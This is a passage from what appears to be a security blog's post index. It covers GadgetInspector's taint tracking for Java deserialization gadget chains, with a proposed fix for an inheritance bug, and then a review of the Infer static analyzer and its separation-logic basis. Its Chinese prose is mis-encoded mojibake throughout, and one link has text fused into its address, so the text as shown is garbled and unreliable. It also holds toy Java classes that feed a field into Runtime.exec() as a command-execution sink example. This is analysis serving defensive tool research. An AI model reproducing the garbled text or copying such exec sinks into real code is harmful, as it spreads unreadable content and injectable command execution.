id="SINKç‚¹"><a href="#SINKç‚¹" class="headerlink" title="SINKç‚¹"></a>SINKç‚¹</h2><p>Sinkç‚¹å®šä¹‰åœ¨gadgetinspector.GadgetChainDiscovery#isSinkï¼š</p><p><img src="/deserialize-AutoFindPOP/1566288878759.png" alt="1566288878759"></p><h2 id="åˆ¤æ–­è¯¥ç±»æ˜¯å¦å¯ä»¥ååºåˆ—åŒ–"><a href="#åˆ¤æ–­è¯¥ç±»æ˜¯å¦å¯ä»¥ååºåˆ—åŒ–" class="headerlink" title="åˆ¤æ–­è¯¥ç±»æ˜¯å¦å¯ä»¥ååºåˆ—åŒ–"></a>åˆ¤æ–­è¯¥ç±»æ˜¯å¦å¯ä»¥ååºåˆ—åŒ–</h2><p>å¯¹äºjavaåŸç”Ÿåºåˆ—åŒ–ï¼Œåˆ¤æ–­é€»è¾‘åœ¨ï¼šgadgetinspector.javaserial.SimpleSerializableDecider#applyNoCacheï¼Œå…¶ä»–åºåˆ—åŒ–æ–¹æ³•æ‰¾å¯¹åº”çš„åŒ…åã€‚</p><h2 id="é»‘åå•"><a href="#é»‘åå•" class="headerlink" title="é»‘åå•"></a>é»‘åå•</h2><p>å¯¹äºjavaåŸç”Ÿåºåˆ—åŒ–ï¼Œé€»è¾‘åœ¨ï¼šgadgetinspector.javaserial.SimpleSerializableDecider#isBlacklistedClassï¼Œå¯ä»¥è¿½åŠ é»‘åå•ã€‚</p><h1 id="ç¨‹åºçš„ä¸€ä¸ªIssue"><a href="#ç¨‹åºçš„ä¸€ä¸ªIssue" class="headerlink" title="ç¨‹åºçš„ä¸€ä¸ªIssue"></a>ç¨‹åºçš„ä¸€ä¸ªIssue</h1><p>åŸç‰ˆæ±¡ç‚¹ä¼ æ’­å­˜åœ¨ä¸€ä¸ªBugï¼Œè€ƒè™‘å¦‚ä¸‹æƒ…å†µï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    String cmd;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getcmd</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> cmd;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> <span class="keyword">extends</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">func</span><span class="params">()</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        Runtime.getRuntime().exec(getcmd());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œç¨‹åºæ— æ³•å‘ç°gadgetï¼Œå› ä¸ºåœ¨è¯»å–getcmd()å­—èŠ‚ç åï¼Œæ±¡ç‚¹ä¼ æ’­æ‰§è¡Œå¦‚ä¸‹ä»£ç ï¼ˆTaintTrackingMethodVisitor.java#L675ï¼‰å‘å¤–ä¼ æ’­æ±¡ç‚¹ï¼š</p><p><img src="/deserialize-AutoFindPOP/1566980149628.png" alt="1566980149628"></p><p>è¿™ä¸€æ„æ€æ˜¯è¯´ï¼Œå¦‚æœpassthroughDataflowï¼ˆç¬¬äºŒæ­¥ï¼‰è®¡ç®—å¾—åˆ°getcmdèƒ½å¤Ÿä¼ æ’­æ±¡ç‚¹ï¼Œé‚£ä¹ˆè¯¥æ±¡ç‚¹å°†ä½œä¸ºå‚æ•°æ¨å…¥å †æ ˆï¼ˆå³ä¼ æ’­åˆ°exec()å‡½æ•°å‚æ•°ä¸Šï¼‰ï¼Œä½†æ˜¯è¿™é‡Œçš„passthroughDataflowå¹¶æ²¡æœ‰B.getcmd()çš„è®°å½•ï¼Œåªæœ‰A.getcmd()è®°å½•â€”â€”å› ä¸ºB.getcmd()ç»§æ‰¿A.getcmd()ï¼Œå› æ­¤æ±¡ç‚¹ä¼ æ’­ä¸­æ–­äº†ã€‚</p><p>å› æ­¤éœ€è¦å¯»æ‰¾å…¶çˆ¶ç±»æŸ¥çœ‹æ˜¯å¦æœ‰è¯¥æ–¹æ³•ï¼Œå°†å›¾ä¸­çš„ä»£ç å—æ¢æˆå¦‚ä¸‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (passthroughDataflow != <span class="keyword">null</span>) &#123;</span><br><span class="line">    Set&lt;Integer&gt; passthroughArgs = passthroughDataflow.get(methodHandle);</span><br><span class="line">    <span class="keyword">if</span> (passthroughArgs == <span class="keyword">null</span> &amp;&amp; inheritanceMap!=<span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="comment">// FIXME ClassA-&gt;ClassB-&gt;ClassC</span></span><br><span class="line">        <span class="comment">//  ClassA.func(), ClassB.func(), ClassC.func()==ClassB.func()!=ClassA.func();</span></span><br><span class="line">        <span class="comment">//  now taint will passthrough if ClassB.func() or ClassA.func() can passthrough.</span></span><br><span class="line">        <span class="comment">//  So FP will arrise.</span></span><br><span class="line">        Set&lt;ClassReference.Handle&gt; superClasses=inheritanceMap.getSuperClasses(clzHandle);</span><br><span class="line">        <span class="keyword">if</span>(superClasses!=<span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">for</span> (ClassReference.Handle superClzHandle: superClasses)&#123;</span><br><span class="line">                List&lt;Set&lt;Integer&gt;&gt; list=passthroughDataflow.entrySet().stream()</span><br><span class="line">                        .filter(e-&gt;(e.getKey().getClassReference().equals(superClzHandle)</span><br><span class="line">                                &amp;&amp; e.getKey().getName().equals(name)</span><br><span class="line">                                &amp;&amp; e.getKey().getDesc().equals(desc)))</span><br><span class="line">                        .map(e-&gt;e.getValue())</span><br><span class="line">                        .collect(Collectors.toList());</span><br><span class="line">                <span class="keyword">if</span>(!list.isEmpty())&#123;</span><br><span class="line">                    passthroughArgs=list.get(<span class="number">0</span>);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (passthroughArgs != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> arg : passthroughArgs) &#123;</span><br><span class="line">            resultTaint.addAll(argTaint.get(arg));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯è¿™æ ·å°±è¿˜å­˜åœ¨ä¸€ä¸ªé—®é¢˜ï¼Œå› ä¸ºgadgetinspector.data.InheritanceMap#getSuperClassesè¿”å›çš„æ˜¯ä¸€ä¸ªé›†åˆï¼Œå› æ­¤ï¼Œæˆ‘ä»¬å¹¶æ²¡æ³•çŸ¥é“çœŸå®è°ƒç”¨exec()çš„æ˜¯å“ªä¸€ä¸ªå‡½æ•°ï¼š</p><p><img src="/deserialize-AutoFindPOP/1566981439728.png" alt="1566981439728"></p><p>è€ƒè™‘å¦‚ä¸‹ä¾‹å­ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    String cmd;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getcmd</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> cmd;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> <span class="keyword">extends</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getcmd</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"whoami"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span> <span class="keyword">extends</span> <span class="title">B</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">func</span><span class="params">()</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        Runtime.getRuntime().exec(getcmd());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨è¿™é‡Œï¼Œå‰é¢çš„ä»£ç ä¼šè¿”å›getcmd()ä¼ æ’­æ±¡ç‚¹â€”â€”çˆ¶ç±»çš„ä»»æ„ä¸€ä¸ªgetcmd()èƒ½ä¼ æ±¡ç‚¹å°±æœ‰æ±¡ç‚¹ï¼Œä½†æ˜¯å®é™…ä¸Šå…¶å¹¶æ²¡æœ‰æ±¡ç‚¹ï¼Œå› ä¸ºå®é™…ä¸Šgetcmd()è°ƒç”¨çš„æ˜¯B.getcmd()ï¼Œå› æ­¤ä¼šäº§ç”Ÿè¯¯æŠ¥ï¼Œé¢„è®¡ä½¿ç”¨æ¥å£çš„è¯è¿™ä¸€ç‚¹ä¼šæ›´åŠ æ˜æ˜¾ã€‚</p><h1 id="ç¼ºé™·"><a href="#ç¼ºé™·" class="headerlink" title="ç¼ºé™·"></a>ç¼ºé™·</h1><ul><li><p>æ— è§†æ§åˆ¶æµï¼Œå¯¼è‡´è¯¯æŠ¥</p></li><li><p>æ— æ³•è¯†åˆ«åå°„çš„SINKç‚¹ï¼Œå¯¼è‡´æ¼æŠ¥</p></li></ul><p><strong>ç›¸å…³ä»£ç ï¼š</strong><a href="https://github.com/Anemone95/gadgetinspector" target="_blank" rel="noopener">https://github.com/Anemone95/gadgetinspector</a></p><h1 id="é™„å½•ï¼šASMæºç "><a href="#é™„å½•ï¼šASMæºç " class="headerlink" title="é™„å½•ï¼šASMæºç "></a>é™„å½•ï¼šASMæºç </h1><p>å…¶æ±¡ç‚¹ä¼ æ’­ç”¨ASMåšçš„ï¼Œå› æ­¤è®°ä¸€ä¸‹å…³äºASMçš„ä¸€äº›ä½¿ç”¨æ–¹æ³•</p><h2 id="ClassReader"><a href="#ClassReader" class="headerlink" title="ClassReader"></a>ClassReader</h2><h2 id="ClassVisitor"><a href="#ClassVisitor" class="headerlink" title="ClassVisitor"></a>ClassVisitor</h2><p>å®šä¹‰åœ¨è¯»å–Classå­—èŠ‚ç æ—¶ä¼šè§¦å‘çš„äº‹ä»¶ï¼Œå¦‚ç±»å¤´è§£æå®Œæˆã€æ³¨è§£è§£æã€å­—æ®µè§£æã€æ–¹æ³•è§£æç­‰ã€‚</p><h2 id="MethodVisitor"><a href="#MethodVisitor" class="headerlink" title="MethodVisitor"></a>MethodVisitor</h2><p>å®šä¹‰åœ¨è§£ææ–¹æ³•æ—¶è§¦å‘çš„äº‹ä»¶ï¼Œå¦‚æ–¹æ³•ä¸Šçš„æ³¨è§£ã€å±æ€§ã€ä»£ç ç­‰ã€‚è¿™é‡Œåªæ˜¯æ“ä½œç ä¸å«æ“ä½œæ•°</p><p>visitInsnï¼šIALOAD~SALOADè§¦å‘è¯¥å‡½æ•°</p><p>visitVarInsn(opcode, var)ï¼šILOAD~ALOADè§¦å‘è¯¥å‡½æ•°ï¼Œvarä¸ºæ“ä½œæ•°</p><p>B4 getfield</p>]]></content>
      
      
      <categories>
          
          <category> Webå®‰å…¨-ååºåˆ—åŒ– </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ååºåˆ—åŒ– </tag>
            
            <tag> Javam </tag>
            
            <tag> è‡ªåŠ¨åŒ– </tag>
            
            <tag> æ±¡ç‚¹ä¼ æ’­ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Inferè¯•ç”¨ä»¥åŠæ‰«æåŸç†åˆ†æ</title>
      <link href="/whitebox-infer/"/>
      <url>/whitebox-infer/</url>
      
        <content type="html"><![CDATA[<p>Inferä½œä¸ºfacebook å¼€æºçš„ä½¿ç”¨ ocaml å¼€å‘é™æ€ä»£ç æ£€æµ‹å·¥å…·ï¼Œä½œä¸ºå…¬å¸çš„äº§å“è°ƒç ”å¯¹è±¡ï¼Œæœ¬æ–‡å°±å…¶ä½¿ç”¨å’ŒåŸç†ä¸¤æ–¹é¢è¿›è¡Œåˆ†æã€‚</p><p>GitHubï¼š<a href="https://github.com/facebook/infer" target="_blank" rel="noopener">https://github.com/facebook/infer</a></p><p>æ•™ç¨‹ï¼š<a href="https://infer.liaohuqiu.net/" target="_blank" rel="noopener">https://infer.liaohuqiu.net/</a></p><a id="more"></a><h1 id="Usage"><a href="#Usage" class="headerlink" title="Usage"></a>Usage</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Gradle</span></span><br><span class="line">infer -- gradle &lt;gradle task, e.g. <span class="string">"build"</span>&gt;</span><br><span class="line">infer -- ./gradlew &lt;gradle task, e.g. <span class="string">"build"</span>&gt;</span><br><span class="line"><span class="comment"># Maven</span></span><br><span class="line">infer -- mvn &lt;maven target&gt;</span><br></pre></td></tr></table></figure><h1 id="æ£€æµ‹èƒ½åŠ›"><a href="#æ£€æµ‹èƒ½åŠ›" class="headerlink" title="æ£€æµ‹èƒ½åŠ›"></a>æ£€æµ‹èƒ½åŠ›</h1><p>Commonï¼š</p><ul><li>Divide By Zero</li><li>Null dereference</li><li>Resource leak</li><li>Integer Overflow</li><li>Unreachable Code</li></ul><p>Javaï¼š</p><ul><li>Injectionï¼ˆSQLï¼ŒShellï¼ŒXSSï¼ŒJSï¼‰</li><li>Deadlock</li><li>Untrusted Deserializationã€Fileã€URLã€â€¦</li><li>Inconsistent Subclass Parameter Annotation(é‡è½½æ–¹æ³•@NotNullä¸ä¸€è‡´ç­‰)</li></ul><p>C/C++ and Objective-Cï¼š</p><ul><li>Memory leak</li><li>Parameter not null checked</li><li>Ivar not null checked</li><li>Premature nil termination argument</li><li>Uninitialized Value</li></ul><p>Bugs reported only in Objective-Cï¼š</p><ul><li>Retain cycle</li><li>Ivar Not Null Checked</li></ul><p>Androidï¼š</p><ul><li>Create Intent From URI</li></ul><p>æ›´è¯¦ç»†çš„åˆ—è¡¨åœ¨ <a href="https://fbinfer.com/docs/next/all-issue-types" target="_blank" rel="noopener">https://fbinfer.com/docs/next/all-issue-types</a></p><p>ä½†æ˜¯å®šä½åˆ°æºä»£ç ï¼š<a href="https://github.com/facebook/whitebox-infer/blob/master/whitebox-infer/src/base/IssueType.mlåï¼Œå‘ç°å…¶è¿˜èƒ½æ£€æµ‹å…¶å­˜åœ¨æ³¨å…¥ç±»å‹çš„æ¼æ´ï¼Œä¸çŸ¥ä¸ºä½•æ²¡æœ‰æ‰«æåˆ°ã€‚" target="_blank" rel="noopener">https://github.com/facebook/whitebox-infer/blob/master/whitebox-infer/src/base/IssueType.mlåï¼Œå‘ç°å…¶è¿˜èƒ½æ£€æµ‹å…¶å­˜åœ¨æ³¨å…¥ç±»å‹çš„æ¼æ´ï¼Œä¸çŸ¥ä¸ºä½•æ²¡æœ‰æ‰«æåˆ°ã€‚</a></p><h1 id="è§„åˆ™ç¼–å†™"><a href="#è§„åˆ™ç¼–å†™" class="headerlink" title="è§„åˆ™ç¼–å†™"></a>è§„åˆ™ç¼–å†™</h1><ul><li><p>Infer AI<br>è‡ªå®šä¹‰è¿‡ç¨‹å†…åˆ†æå’Œè¿‡ç¨‹é—´åˆ†æå®ç°ï¼Œ<a href="https://fbinfer.com/docs/next/absint-framework" target="_blank" rel="noopener">https://fbinfer.com/docs/next/absint-framework</a>ï¼š</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">module Analyzer =</span><br><span class="line">  AbstractInterpreter.Make</span><br><span class="line">    (ProcCfg.Backward(ProcCfg.Exceptional))</span><br><span class="line">    (TransferFunctions)</span><br><span class="line">module Summary = Summary.Make (struct</span><br><span class="line">    type summary = SiofDomain.astate</span><br><span class="line">    let update_payload astate payload =</span><br><span class="line">      &#123; payload with Specs.siof = Some astate &#125;</span><br><span class="line">    let read_from_payload payload =</span><br><span class="line">      payload.Specs.siof</span><br><span class="line">  end)</span><br></pre></td></tr></table></figure></li><li><p>Infer AL</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">DEFINE-CHECKER STRONG_DELEGATE_WARNING = &#123;</span><br><span class="line">        // ä¸€ä¸ªå±æ€§è‹¥åŒ…å«â€œdelegateâ€ä¸”ä¸åŒ…å«â€œqueueâ€ï¼Œé‚£ä¹ˆå®ƒä¸åº”è¯¥å®šä¹‰ä¸ºstring</span><br><span class="line">    LET name_contains_delegate =</span><br><span class="line">        declaration_has_name(REGEXP(<span class="string">"[dD]elegate"</span>));</span><br><span class="line">    LET name_does_not_contain_queue =</span><br><span class="line">        NOT declaration_has_name(REGEXP(<span class="string">"[qQ]ueue"</span>));</span><br><span class="line">    SET report_when =</span><br><span class="line">        WHEN</span><br><span class="line">           name_contains_delegate</span><br><span class="line">           AND name_does_not_contain_queue</span><br><span class="line">           AND is_strong_property()</span><br><span class="line">        HOLDS-IN-NODE ObjCPropertyDecl;</span><br><span class="line">    SET message = <span class="string">"Property or ivar %decl_name% declared strong"</span>;</span><br><span class="line">    SET suggestion = <span class="string">"In general delegates should be declared weak or assign"</span>;</span><br><span class="line">    SET severity = <span class="string">"WARNING"</span></span><br><span class="line">  &#125;;</span><br></pre></td></tr></table></figure></li><li><p>Infer<br>Quandary(<a href="https://github.com/facebook/infer/blob/master/infer/tests/codetoanalyze/java/quandary/.inferconfig" target="_blank" rel="noopener">https://github.com/facebook/infer/blob/master/infer/tests/codetoanalyze/java/quandary/.inferconfig</a>)</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"force-delete-results-dir"</span>: <span class="literal">true</span>,</span><br><span class="line">  <span class="attr">"quandary-sources"</span>: [</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">"procedure"</span>: <span class="string">"codetoanalyze.java.quandary.ExternalSpecs.privateData*"</span>,</span><br><span class="line">      <span class="attr">"kind"</span>: <span class="string">"PrivateData"</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">"procedure"</span>: <span class="string">"codetoanalyze.java.quandary.InterfaceSpec.source"</span>,</span><br><span class="line">      <span class="attr">"kinds"</span>: [<span class="string">"PrivateData"</span>, <span class="string">"Other"</span>]</span><br><span class="line">    &#125;</span><br><span class="line">  ],</span><br><span class="line">  <span class="attr">"quandary-sinks"</span>: [</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">"procedure"</span>: <span class="string">"codetoanalyze.java.quandary.ExternalSpecs.loggingSink1"</span>,</span><br><span class="line">      <span class="attr">"kind"</span>: <span class="string">"Logging"</span>,</span><br><span class="line">      <span class="attr">"index"</span>: <span class="string">"1"</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">"procedure"</span>: <span class="string">"codetoanalyze.java.quandary.ConstructorSink.&lt;init&gt;"</span>,</span><br><span class="line">      <span class="attr">"kind"</span>: <span class="string">"Other"</span>,</span><br><span class="line">      <span class="attr">"index"</span>: <span class="string">"0"</span></span><br><span class="line">    &#125;</span><br><span class="line">  ],</span><br><span class="line">  <span class="attr">"quandary-sanitizers"</span>: [</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">"procedure"</span>: <span class="string">"codetoanalyze.java.quandary.ExternalSpecs.sanitizer"</span></span><br><span class="line">    &#125;</span><br><span class="line">  ],</span><br><span class="line">  <span class="attr">"quandary-endpoints"</span>: [</span><br><span class="line">    <span class="string">"codetoanalyze.java.quandary.MyService"</span></span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h1 id="è¯•ç”¨"><a href="#è¯•ç”¨" class="headerlink" title="è¯•ç”¨"></a>è¯•ç”¨</h1><p>Webgoatæ£€æµ‹åˆ°16ä¸ªé—®é¢˜ï¼Œ14ä¸ªç©ºå¼•ç”¨å’Œ2ä¸ªèµ„æºæ³„éœ²ï¼š</p><p><img src="/whitebox-infer/1566373102585.png" alt="1566373102585"></p><p>æ‰«æInsecureBankv2:</p><p><img src="/whitebox-infer/1566370930925.png" alt="1566370930925"></p><h1 id="ä¼˜åŠ¿"><a href="#ä¼˜åŠ¿" class="headerlink" title="ä¼˜åŠ¿"></a>ä¼˜åŠ¿</h1><ul><li><p>å¢é‡åˆ†æ</p></li><li><p>èƒ½å¤Ÿåˆ†æå¤§è§„æ¨¡ç¨‹åº</p></li></ul><h1 id="ç‰¹è‰²"><a href="#ç‰¹è‰²" class="headerlink" title="ç‰¹è‰²"></a>ç‰¹è‰²</h1><p><a href="https://infer.liaohuqiu.net/docs/separation-logic-and-bi-abduction.html" target="_blank" rel="noopener">åˆ†ç¦»é€»è¾‘ï¼ˆseparation logicï¼‰å’ŒåŒå‘å‡è¯´æ¨ç†ï¼ˆbi-abductionï¼‰</a>ï¼Œ<a href="https://en.wikipedia.org/wiki/Hoare_logic" target="_blank" rel="noopener">éœå°”é€»è¾‘</a>å’Œ<a href="https://en.wikipedia.org/wiki/Abstract_interpretation" target="_blank" rel="noopener">æŠ½è±¡è§£é‡Š</a>ï¼Œåˆ†ç¦»é€»è¾‘ç”¨æ¥æ£€æµ‹bugï¼ŒåŒå‘å‡è¯´æ¨ç†ç”¨æ¥åšå¢é‡åˆ†æã€‚</p><h2 id="åˆ†ç¦»é€»è¾‘"><a href="#åˆ†ç¦»é€»è¾‘" class="headerlink" title="åˆ†ç¦»é€»è¾‘"></a>åˆ†ç¦»é€»è¾‘</h2><p>ä¸€å¼€å§‹ç”¨äºå†…å­˜ç®¡ç†çš„é€»è¾‘</p><script type="math/tex; mode=display">x\mapsto y * y\mapsto x</script><p>$x \mapsto y$ æŒ‡æŒ‡é’ˆxæŒ‡å‘å€¼yï¼ˆx points to yï¼‰ï¼Œ$A*B$æŒ‡Aå’ŒBå¤„äºåˆ†ç¦»çš„ä¸¤å—å†…å­˜ä¸­ï¼ˆand separatelyï¼‰ï¼Œå› æ­¤ä»¥ä¸Šå…¬å¼è¢«å«åšï¼ˆx æŒ‡å‘yï¼ŒåŒæ—¶yæŒ‡å‘xï¼‰ï¼Œå¯ä»¥ç”¨ä¸‹å›¾è¡¨ç¤ºï¼š</p><p><img src="/whitebox-infer/SepSplit.jpg" alt="static/images/SepSplit.jpg"></p><p>æ¥ç€ä½¿ç”¨Hoareä¸‰å…ƒç»„$\{pre\}prog\{post\}$ï¼Œè¡¨ç¤ºç¨‹åºè¡Œä¸ºï¼Œ$pre$æŒ‡å‰ç½®æ¡ä»¶ï¼Œ$prog$æŒ‡ç¨‹åºç‰‡æ®µ$post$ä¸ºåç½®æ¡ä»¶ã€‚ä¾‹å¦‚ä½¿ç”¨Hoareä¸‰å…ƒç»„æè¿°ä¸€ä¸ªå…³é—­èµ„æºçš„å‡½æ•°ï¼š</p><script type="math/tex; mode=display">\{r\mapsto open\}closeResource(r)\{r\mapsto closed\}(spec)</script><p>å®ƒè¯´æ˜ï¼Œä¸€ä¸ªæ­£ç¡®çš„å…³é—­èµ„æºçš„å‡½æ•°è¿è¡Œå‰ï¼Œrèµ„æºåº”è¯¥æ˜¯æ‰“å¼€çš„ï¼Œè¿è¡Œårèµ„æºåº”è¯¥æ˜¯å…³é—­çš„ï¼Œå¦‚æœä¸ç¬¦åˆåˆ™ä»£ç æœ‰é—®é¢˜ã€‚</p><p>é‚£ä¹ˆè‹¥æœ‰ä¸¤ä¸ªèµ„æº$r_1$å’Œ$r_2$ä»…å…³é—­$r_1$å¯ä»¥è¡¨ç¤ºæˆï¼š</p><script type="math/tex; mode=display">\{r_1\mapsto open * r_2\mapsto open\}closeResource(r_1)\{r_1\mapsto closed * r_2\mapsto open\}(use)</script><p>è¿™é‡Œä½¿ç”¨äº†ä¸€ä¸ªå°è§„èŒƒï¼ˆspecï¼‰å»æ›´æ–°äº†ä¸€ä¸ªå¤§è§„èŒƒï¼ˆuseï¼‰ï¼Œæ›´ä¸€èˆ¬çš„ï¼Œæˆ‘ä»¬æœ‰ï¼š</p><script type="math/tex; mode=display">\{pre\}prog\{post\}\rightarrow\{pre*frame\}prog\{post*frame\}</script><p>è¿™ä¸€è§„åˆ™ä¹Ÿè¢«ç§°ä¸ºé€»è¾‘åˆ†ç¦»ä¸­çš„frameè§„åˆ™ï¼Œ$frame$æè¿°äº†ä¸å˜çš„çŠ¶æ€ï¼Œå±äºæ¥è‡ªäºå°±åƒåŠ¨ç”»åœºæ™¯ä¸­èƒŒæ™¯ï¼ˆframeï¼‰â€”â€”åŠ¨ç”»åœºæ™¯ä¸­èƒŒæ™¯ä¸ä¼šå˜ã€‚</p><p>è¿™ä¸€è§„åˆ™ç”¨äºæ•°å­¦æ¨ç†ï¼Œå®ƒæ­ç¤ºäº†é€»è¾‘æ¨ç†åº”è¯¥èšç„¦äºç¨‹åºè®¿é—®èµ„æºçš„é‚£ä¸€å—é€»è¾‘ï¼Œå¹¶ä¸”åˆ†ç¦»çš„ä¸¤å—å¯ä»¥ç‹¬ç«‹åˆ†æã€‚</p><h2 id="åŒå‘å‡è¯´æ¨ç†"><a href="#åŒå‘å‡è¯´æ¨ç†" class="headerlink" title="åŒå‘å‡è¯´æ¨ç†"></a>åŒå‘å‡è¯´æ¨ç†</h2><p>Aæ¨å‡ºBè¡¨ç¤ºä¸ºï¼š</p><script type="math/tex; mode=display">A \vdash B</script><p>åœ¨ä¼ ç»Ÿé€»è¾‘æ¨ç†ä¸­ï¼Œä¸€ä¸ªæ¨ç†é—®é¢˜è¢«å®šä¹‰ä¸ºï¼š</p><ul><li><p>ç»™å®šå‡è®¾Aå’Œç›®æ ‡G</p></li><li><p>æ‰¾åˆ°ä¸€ä¸ªMï¼Œä½¿å¦‚ä¸‹å…¬å¼æˆç«‹ï¼š</p><script type="math/tex; mode=display">A \land M \vdash G</script></li></ul><p>åº”ç”¨åˆ°åˆ†ç¦»é€»è¾‘é—®é¢˜ï¼Œå³ï¼š</p><script type="math/tex; mode=display">A * M \vdash G</script><p>åŒå‘å‡è¯´æ¨ç†å°†é—®é¢˜æ‹“å±•æˆï¼š</p><script type="math/tex; mode=display">A*?antiframe \vdash G*?frame</script><p>å³inferéœ€è¦æ‰¾åˆ°ä¸€å¯¹$antiframe$å’Œ$frame$è®©ä¸Šå¼æˆç«‹ã€‚</p><p>è¿™åœ¨åšå¢é‡æ‰«ææ˜¯å¾ˆé‡è¦ã€‚</p><p>ä¸ºäº†è¯´æ˜é—®é¢˜ï¼Œä¾‹å¦‚æˆ‘ä»¬æœ‰å¦‚ä¸‹å‡½æ•°ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td 